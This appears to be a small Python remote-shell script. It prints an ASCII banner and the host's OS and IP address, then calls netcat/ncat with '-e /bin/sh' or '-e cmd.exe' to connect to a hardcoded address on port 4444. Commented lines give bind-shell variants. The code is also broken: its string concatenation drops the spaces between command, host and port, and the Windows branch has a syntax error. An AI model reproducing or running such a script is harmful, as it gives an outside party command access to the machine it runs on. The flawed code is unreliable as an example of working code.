import platform
import os
import sysconfig
import socket  
def run():
  hostname=socket.gethostname()   
  IPAddr=socket.gethostbyname(hostname) 
  iph='172.16.22.82'
  lport='4444'
  print('')
  print(' ############### # # # ##############')
  print(' ####### ###### # #  # # ####### ####')
  print(' ######   ##### ##    ## ######   ###')
  print(' ####### #######  #  #  ######## ####')
  print(' ################ ### ###############')
  print('')
  print('# OS name: ', platform.system())
  if "Linux" in platform.system():
    print('Linux: ', sysconfig.get_platform()) 
    print(' IpAddress: ', IPAddr)
    #os.system( 'nc -lvp 4444 -e /bin/sh')
    os.system('nc' + iph+ lport + ' -e /bin/sh')
  elif "Windows" in platform.system():
    print('Windows: ', sysconfig.get_platform()) 
    print('Address ip: ', IPAddr)
    #os.system('ncat -lvp 4444 -e cmd.exe')
    os.system('ncat '+ iph + lport ' -e cmd.exe')
